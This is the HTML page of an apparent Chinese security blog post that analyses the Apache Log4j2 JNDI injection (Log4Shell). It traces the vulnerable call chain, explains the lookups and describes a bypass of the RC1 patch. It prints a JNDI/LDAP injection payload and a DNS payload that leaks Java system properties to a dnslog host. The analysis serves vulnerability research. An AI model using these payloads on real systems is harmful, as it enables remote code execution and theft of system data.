@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="补丁分析根据官方Github Restrict LDAP access via JNDI 的这条PR可知漏洞为JNDI注入，从补丁中也能得知修复方式添加了LDAP Server白名单及白名单类，位于 log4j-core&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;net&#x2F;JndiManager.java。  对于补丁后的 JndiManager#loo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Log4j2 JNDI注入">
+<meta property="og:url" content="http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Search is Null">
+<meta property="og:description" content="补丁分析根据官方Github Restrict LDAP access via JNDI 的这条PR可知漏洞为JNDI注入，从补丁中也能得知修复方式添加了LDAP Server白名单及白名单类，位于 log4j-core&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;net&#x2F;JndiManager.java。  对于补丁后的 JndiManager#loo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212154503.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212154747.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212155655.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212155915.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212160057.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212160724.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212162820.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212163008.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212164434.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212171409.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212171527.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212172002.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212172143.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212172554.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212214549.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215150.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215342.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215549.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215909.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212220313.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212220552.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212231437.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212231443.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212231419.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212232112.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212232620.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212232722.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213000406.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213000822.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213002756.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213003609.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213003904.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004042.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004354.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004529.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004623.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213005945.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213224108.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213224338.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213225607.png">
+<meta property="og:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213231528.png">
+<meta property="article:published_time" content="2021-12-13T15:17:00.000Z">
+<meta property="article:modified_time" content="2021-12-13T15:17:21.057Z">
+<meta property="article:author" content="Search?&#x3D;Null">
+<meta property="article:tag" content="Apache Log4j2">
+<meta property="article:tag" content="Java JNDI Inject">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212154503.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Apache Log4j2 JNDI注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Search is Null" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/12/05/Java-WebService%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&text=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&is_video=false&description=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Apache Log4j2 JNDI注入&body=Check out this article: http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&name=Apache Log4j2 JNDI注入&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&t=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#补丁分析"><span class="toc-number">1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lookups"><span class="toc-number">3.</span> <span class="toc-text">Lookups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#upper-amp-lower"><span class="toc-number">3.1.</span> <span class="toc-text">upper &amp; lower</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-amp-env"><span class="toc-number">3.2.</span> <span class="toc-text">sys &amp; env</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#…"><span class="toc-number">3.3.</span> <span class="toc-text">…</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RC1补丁-Bypass"><span class="toc-number">4.</span> <span class="toc-text">RC1补丁 Bypass</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Apache Log4j2 JNDI注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Search is Null</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-13T15:17:00.000Z" itemprop="datePublished">2021-12-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Apache-Log4j2/" rel="tag">Apache Log4j2</a>, <a class="tag-link" href="/tags/Java-JNDI-Inject/" rel="tag">Java JNDI Inject</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>根据官方Github <a href="https://github.com/apache/logging-log4j2/pull/608/commits/755e2c9d57f0517a73d16bfcaed93cc91969bdee" target="_blank" rel="noopener">Restrict LDAP access via JNDI</a> 的这条PR可知漏洞为JNDI注入，从补丁中也能得知修复方式添加了LDAP Server白名单及白名单类，位于 <strong>log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java</strong>。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212154503.png" alt="image-20211212154458202"></p>
+<p>对于补丁后的 <strong>JndiManager#lookup</strong> 方法其使用 <code>URI</code> 类解析，如果协议为 <code>LDAP</code> 则 <code>Host</code> 必须为 <code>allowHosts</code> 中存在的 <code>Host</code>，否则无法发起请求。（即无法调用lookup）。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212154747.png" alt="image-20211212154747384"></p>
+<p>从补丁中可得知如下信息：</p>
+<ul>
+<li>漏洞为JNDI注入</li>
+<li>修复方式采用白名单</li>
+</ul>
+<p>而 <strong>log4j2</strong> 是一个日志组件/框架，其提供的功能也就是打印日志并存储，可控的输入点实际上不会太多，从官方文档可知污点大概率会存在于日志打印时的 <code>info</code>、<code>debug</code>、<code>error</code>等方法中，只有在调用这些方法时才会大概率拼接上用户可控的输入参数（Sink）。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在撰写本文时网上已经公布了该漏洞的Poc，直接在 <code>logger.error</code>处断点分析，进入 <strong>AbstractLogger#error</strong>方法。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212155655.png" alt="image-20211212155655109"></p>
+<p>调用 <code>logIfEnabled</code> 方法时传入的第二个参数（即日志等级）为 <code>Level.ERROR</code> 值为 <code>200</code>。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212155915.png" alt="image-20211212155915657"></p>
+<p>回到 <code>logIfEnabled</code> 方法中其会调用 <code>isEnabled</code> 方法，其中 <code>level</code>对象的值为 <code>200</code>， <code>message</code> 变量为打印的消息。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212160057.png" alt="image-20211212160057118"></p>
+<p>进入 <code>isEnabled</code> 调用 <code>Logger$PrivateConfig#filter</code> 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.privateConfig.filter(level, marker, message, t);</span><br></pre></td></tr></table></figure>
+
+<p>在<code>filter</code>方法中如果当前对象的 <code>intLevel</code>成员变量大于等于 <code>level.intLevel()</code>方法的返回值则返回 <code>true</code>，而此处返回 <code>true</code>则会进入 <code>if</code>分支中调用 <code>logMessage</code>方法，反之则无法调用。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212160724.png" alt="image-20211212160724031"></p>
+<p>而 <code>Logger.intLevel</code> 的值默认为 <code>ERROR</code> 即200，所以一些伙伴在本地复现漏洞时会发现只有 <code>error</code>、<code>fatal</code>方法能触发漏洞，实际上是因为 <code>log4j</code>的默认日志等级为 <code>error</code>，所以即使使用 <code>logger.info</code>打印任何消息在控制台中也不会输出日志信息，但在实际的生产环境中，部分开发会将日志等级设置为 <code>info</code>、<code>debug</code>等便降低了漏洞利用门槛。（如果你需要在 <code>info</code>等方法中复现漏洞只需手动设置日志等级即可）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Configurator.setLevel(LogManager.getLogger(HelloWorld<span class="class">.<span class="keyword">class</span>), <span class="title">Level</span>.<span class="title">info</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>（下图说明了默认的日志等级为ERROR）</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212162820.png" alt="image-20211212162820477"></p>
+<p>回到 <code>logIfEnabled</code> 方法其会调用 <code>logMessage</code>方法将 <code>message</code>字符串封装为 <code>Message</code>对象再调用 <code>logMessageSafely</code> 方法。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212163008.png" alt="image-20211212163008181"></p>
+<p>调用 <code>logMessageTrackRecursion</code>方法:</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212164434.png" alt="image-20211212164434557"></p>
+<p><code>incrementRecursionDepth</code> 方法会调用至 <code>getRecursionDepthHolder</code> 方法， <code>recursionDepthHolder</code>是一个 <code>ThreadLocal</code> 的 <code>int[]</code>数组变量，表示当前递归深度。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212171409.png" alt="image-20211212171409335"></p>
+<p>而后再进入 <code>tryLogMessage</code> 方法中调用 <code>log</code> 方法：</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212171527.png" alt="image-20211212171527362"></p>
+<p><code>this.privateConfig.loggerConfig.getReliabilityStrategy()</code> 返回 <code>LoggerConfig.reliabilityStrategy</code>的成员变量，其在初始化时赋值为 <code>DefaultReliabilityStrategy</code>对象，该对象实现 <code>LocationAwareReliabilityStrategy</code>接口因此进入IF分支。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212172002.png" alt="image-20211212172002173"></p>
+<p>调用 <code>LoggerConfig#log</code> 方法：</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212172143.png" alt="image-20211212172143575"></p>
+<p><code>propertiesRequireLookup</code>成员变量在默认构造器初始化时被赋值为 <code>false</code>，再此调用重载的 <code>log</code> 方法。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212172554.png" alt="image-20211212172554068"></p>
+<p><code>LoggerConfig.filter</code> 为 <code>null</code>进入 <code>processLogEvent</code> 方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212214549.png" alt="image-20211212214549259"></p>
+<p><code>event.setIncludeLocation</code> 赋值 <code>MutablelogEvent</code>对象的 <code>includeLcation</code>成员变量为true，<code>LoggerConfig$LoggerConfigPredicate#allow</code>方法默认返回true进入IF分支，调用 <code>callAppenders</code> 方法。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215150.png" alt="image-20211212215150476"></p>
+<p>调用 <code>AppenderControl#callAppender</code>方法:</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215342.png" alt="image-20211212215342637"></p>
+<p>在 <code>AppenderControl#callAppenderPreventRecursion</code>方法中调用 <code>callAppender0</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215549.png" alt="image-20211212215549344"></p>
+<p>进入 <code>tryCallAppender</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212215909.png" alt="image-20211212215909157"></p>
+<p>调用 <code>this.appender</code> 为 <code>ConsoleAppender</code>对象，由于子类不存在 <code>append</code>方法，因此会调用到父类 <code>AbstractOutputStreamAppender#append</code> 方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212220313.png" alt="image-20211212220313919"></p>
+<p> <code>directEncodeEvent</code>方法中调用 <code>PatternLayout#encode</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212220552.png" alt="image-20211212220552655"></p>
+<p>进入 <code>PatternLayout#toText</code> 方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212231437.png" alt="image-20211212224215928"></p>
+<p>调用 <code>PatternLayout$PatternSerializer#toSerializable</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212231443.png" alt="image-20211212230333931"></p>
+<p><code>formatters</code>变量是 <code>PatternFormatter[]</code>对象数组，循环调用这些对象的 <code>format</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212231419.png" alt="image-20211212231419588"></p>
+<p>循环至 <code>PatternFormatter</code>对象的 <code>converter</code>的成员变量为 <code>MessagePatternConverter</code>对象时进入其 <code>format</code>方法分析</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212232112.png" alt="image-20211212231747332"></p>
+<p>当 <code>workingBuilder</code>的第一位字符为 <code>$</code>与第二位字符为 <code>{</code>时进入分支中，从 <code>DefaultConfiguration</code>对象获取 <code>StrSubstitutor</code>对象调用其 <code>replace</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212232620.png" alt="image-20211212232620287"></p>
+<p>跟进 <code>substitute</code> 方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211212232722.png" alt="image-20211212232722756"></p>
+<p><code>substitute</code>方法中的 <code>while</code> 循环内获取打印的消息中 <code>${</code>的结束位置索引，而此处打印的消息为 <code>${jndi:ldap://192.168.0.114:1389/ygoa8q}</code>，因此为 <code>2</code>。而后进入 <code>else</code>分支中</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213000406.png" alt="image-20211213000406582"></p>
+<p><code>else</code> 分支中的 <code>while</code>循环中如果 <code>pos</code>大于等于 <code>bufEnd</code>则跳出 <code>label117</code>标记的循环（即当前位置大于字符总长度时跳出循环），随后的 <code>if</code> 判断中 <code>pos</code>（起始位置）为2，因此 <code>prefixMatcher.isMatch</code> 返回 <code>0</code>，进入 <code>else</code> 分支。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213000822.png" alt="image-20211213000822650"></p>
+<p>对打印的消息进行处理后会调用 <code>resolveVariable</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213002756.png" alt="image-20211213002756890"></p>
+<p>此处即可查看<code>StrSubstitutor.variableResolver</code>中包含 <code>jndi</code>、<code>sys</code>、<code>env</code>等等…（与后续的信息泄露利用相关）</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213003609.png" alt="image-20211213003609588"></p>
+<p>通过分号进行截取 <code>prefix</code> 与 <code>name</code>，从 <code>strLookupMap</code>属性获取 <code>JndiLookup</code>对象（strLookupMap为Map&lt;String, StrLookup&gt;），此处调用至 <code>JndiLookup#lookup</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213003904.png" alt="image-20211213003904053"></p>
+<p><code>convertJndiName</code> 方法判断传入字符串参数如果不以 <code>java:comp/env/</code> 开头且不包含 <code>:</code>，则会为其添加 <code>java:comp/env/</code>前缀并返回。</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004042.png" alt="image-20211213004042013"></p>
+<p><code>JndiManager#getDefaultManager</code>获取 <code>JndiManager</code>实例对象后调用其 <code>lookup</code>方法</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004354.png" alt="image-20211213004354639"></p>
+<p><code>context</code>为 <code>javax.naming.InitialContext</code>对象，调用其 <code>lookup</code>方法且参数可控最终造成JNDI注入</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004529.png" alt="image-20211213004529736"></p>
+<p>Poc</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213004623.png" alt="image-20211213004623013"></p>
+<h1 id="Lookups"><a href="#Lookups" class="headerlink" title="Lookups"></a>Lookups</h1><p>上述 <code>Debug</code>过程中可得知除了 <code>jndi</code>外还支持 <code>lower</code>、<code>upper</code>、<code>sys</code>、<code>env</code>等等…</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213005945.png" alt="image-20211213005945664"></p>
+<h2 id="upper-amp-lower"><a href="#upper-amp-lower" class="headerlink" title="upper &amp; lower"></a>upper &amp; lower</h2><p>顾名思义，该Lookup用于转换为大写，<code>LowerLookup</code>同理</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213224108.png" alt="image-20211213224108521"></p>
+<h2 id="sys-amp-env"><a href="#sys-amp-env" class="headerlink" title="sys &amp; env"></a>sys &amp; env</h2><p>调用 <code>System.getProperty</code>获取系统属性，<code>env</code>同理用于获取系统环境变量，配合 <code>{jndi:dns://{${sys:java.version}.dnslog.cn}}</code>可通过DNS外带系统属性或环境变量值</p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213224338.png" alt="image-20211213224338512"></p>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213225607.png" alt="image-20211213225607863"></p>
+<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p><strong>其余Lookup感兴趣的可自行尝试。</strong></p>
+<h1 id="RC1补丁-Bypass"><a href="#RC1补丁-Bypass" class="headerlink" title="RC1补丁 Bypass"></a>RC1补丁 Bypass</h1><blockquote>
+<p>RC1的补丁在 <code>org.apache.logging.log4j.core.net.JndiManager</code>类中新增了白名单验证，如果协议为 <code>LDAP</code>或<code>LDAPS</code>则Host必须为 <code>allowedHosts</code> 列表中（默认只有本地IP存在）。但由于解析JNDI链接时使用 <code>java.net.URI</code>类解析，且捕捉了 <code>URISyntaxException</code>异常未进行任何操作，在代码走到方法最后时执行 <code>lookup</code>，导致RC1补丁被绕过。（但RC1补丁默认情况下已经不会开启LookUp，所以需要在手动开启该功能的情况下才会触发漏洞），而RC2的补丁则是在捕获异常处直接 <code>return null</code>。</p>
+</blockquote>
+<p><img src="https://searchnull-image.oss-cn-shenzhen.aliyuncs.com/20211213231528.png" alt="image-20211213231528199"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#补丁分析"><span class="toc-number">1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lookups"><span class="toc-number">3.</span> <span class="toc-text">Lookups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#upper-amp-lower"><span class="toc-number">3.1.</span> <span class="toc-text">upper &amp; lower</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-amp-env"><span class="toc-number">3.2.</span> <span class="toc-text">sys &amp; env</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#…"><span class="toc-number">3.3.</span> <span class="toc-text">…</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RC1补丁-Bypass"><span class="toc-number">4.</span> <span class="toc-text">RC1补丁 Bypass</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&text=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
